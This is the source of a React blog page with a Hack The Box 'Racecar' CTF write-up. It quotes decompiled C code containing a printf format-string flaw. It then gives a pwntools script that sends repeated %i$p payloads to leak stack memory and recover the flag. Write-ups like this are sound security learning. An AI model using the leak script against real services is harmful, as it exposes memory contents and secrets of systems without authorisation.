'use client';
import FooterBlog from "@/components/blog/Footer";
import HeaderBlog from "@/components/blog/HeaderBlog";
import TableContent from "@/components/blog/TableContent";
import SubHeader from "@/components/blog/SubHeader";
import SubPara from "@/components/blog/SubPara";
import SubImage from "@/components/blog/SubImage";
import { Divider, Link, Code } from "@nextui-org/react";
import { list_post } from "@/config/post";
import hljs from "highlight.js";
import 'highlight.js/styles/atom-one-dark.css';
import { useEffect } from "react";
export default function Page() {
    hljs.registerLanguage('c', require('highlight.js/lib/languages/c'));
    hljs.registerLanguage('python', require('highlight.js/lib/languages/python'));

    useEffect(() => {
        hljs.initHighlighting();
    }, []);

    const findDate = (header: string) => {
        // Check if list_post array exists and has items
        if (list_post && list_post.length > 0) {
            // Iterate through the array
            for (let i = 0; i < list_post.length; i++) {
                const post = list_post[i];
                // Check if the post object has the header property
                if (post && post.header === header) {
                    // Return the header value
                    return post.date;
                }
            }
            // If no header found in any post
            return "Header not found";
        } else {
            // If list_post array is empty or undefined
            return "No posts found";
        }
    };

    const date = findDate('Racecar');
    const items = [
        {
            key: 'Introduction',
            label: 'Introduction',
            idx: '#introduction'
        },
        {
            key: 'Exploitation',
            label: 'Exploitation',
            idx: '#exploitation'
        },
    ];
    return (
        <div className="mt-3 w-[90%] md:w-4/5 mx-auto">
            <HeaderBlog name={'Racecar'} />
            <Divider />
            <TableContent items={items} />
            <div id="introduction" className="my-2">
                <SubHeader item={{ num: '1', content: 'Introduction' }} />
                <SubPara content={'Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!'} />
                <Link
                    href={'https://app.hackthebox.com/challenges/racecar'}
                    color="warning"
                    underline="hover"
                    target="_blank"
                >Link racecar challenge!</Link>
            </div>
            <div id="exploitation" className="my-2">
                <SubHeader item={{ num: '2', content: 'Exploitation' }} />
                <SubPara content={'Run this program'} />
                <SubImage img={{
                    alt: 'intro',
                    path: '/images/racecar/img1.png',
                    size: 400
                }} />
                <SubPara content={'Decompile racecar program by using decompile tools example: ghida or other ..., you can see car_menu function. This have a vulns, we can exploit from this.'} />
                <pre className=" h-[300px]  overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="c">{`void car_menu(void)
{
  int iVar1;
  int iVar2;
  uint __seed;
  size_t sVar3;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  int local_5c;
  int local_58;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  do {
    printf(&DAT_00011948);
    iVar1 = read_int();
    if ((iVar1 != 2) && (iVar1 != 1)) {
      printf("\\n%s[-] Invalid choice!%s\\n","\\x1b[1;31m","\\x1b[1;36m");
    }
  } while ((iVar1 != 2) && (iVar1 != 1));
  iVar2 = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
    local_5c = rand();
    local_5c = local_5c % 10;
    local_58 = rand();
    local_58 = local_58 % 100;
  }
  else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
    local_5c = rand();
    local_5c = local_5c % 100;
    local_58 = rand();
    local_58 = local_58 % 10;
  }
  else {
    local_5c = rand();
    local_5c = local_5c % 100;
    local_58 = rand();
    local_58 = local_58 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar3 = strlen("\\n[*] Waiting for the race to finish...");
    if (sVar3 <= local_54) break;
    putchar((int)"\\n[*] Waiting for the race to finish..."[local_54]);
    if ("\\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((iVar1 == 1) && (local_5c < local_58)) || ((iVar1 == 2 && (local_58 < local_5c)))) {
    printf("%s\\n\\n[+] You won the race!! You get 100 coins!\\n","\\x1b[1;32m");
    coins = coins + 100;
    printf("[+] Current coins: [%d]%s\\n",coins,"\\x1b[1;36m");
    printf("\\n[!] Do you have anything to say to the press after your big victory?\\n> %s","\\x1b[0m")
    ;
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\\n","\\x1b[1;31m");
                    // WARNING: Subroutine does not return
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\\n\\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1b[0m"
        );
    printf(__format);
  }
  else if (((iVar1 == 1) && (local_58 < local_5c)) || ((iVar1 == 2 && (local_5c < local_58)))) {
    printf("%s\\n\\n[-] You lost the race and all your coins!\\n","\\x1b[1;31m");
    coins = 0;
    printf("[+] Current coins: [%d]%s\\n",0,"\\x1b[1;36m");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;`}</code></pre>
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">printf(__format); // this dont have format string, we can exploit this!</Code>
                </div>
                <Link
                    href={'https://axcheron.github.io/exploit-101-format-strings/'}
                    color="warning"
                    underline="hover"
                    target="_blank"
                >Exploit 101 - Format Strings</Link>
                <SubPara content={'Following the control flow of the program, you need to input your name and nickname, then type 2, followed by 2 again, and finally 1. This will lead you to the print(_format) function.'}/>
                <SubImage img={{
                    alt: 'exploit1',
                    path: '/images/racecar/img2.png',
                    size: 400
                }} />
                <SubPara content={'I have written a Python program to exploit this vulnerability. Please remember to launch the machine on Hack The Box'}/>
                <pre className="overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="python">{`from pwn import *
flag = ''
def send(payload):
    p = remote('94.237.58.148', 41012)
    p.sendlineafter(b'Name: ', b'toan')
    p.sendlineafter(b'Nickname: ', b'toan')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', payload.encode()) # send to get pointer at i
    p.recvline()
    p.recvline()
    retn = p.recv()
    return retn
def byteToChr(result):
    decoded = unhex(result.strip().decode()[2:])
    reversed_hex = decoded[::-1]
    print(str(reversed_hex))
    return reversed_hex
if __name__ == '__main__':
    retn = ''
    i = 1
    while True:
        payload = f"%{i}$p" # point offset format
        print(f"send payload: {payload}")
        try:
            r = send(payload)
            if b'nill' in r:
                break
            retn += byteToChr(r).decode('latin-1')
            print(retn)
        except: 
            print('have errorr hehe....')
            break
        i += 1
    print(retn)
`}</code></pre>
            <SubPara content={'See result and get flag!'} />
            <SubImage img={{
                    alt: 'img3',
                    path: '/images/racecar/img3.png',
                    size: 400
                }} />
            <SubImage img={{
                    alt: 'img4',
                    path: '/images/racecar/img4.png',
                    size: 400
                }} />
            <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">Done!</Code>
                </div>
            </div>
            <FooterBlog date={date} />
        </div>
    );
}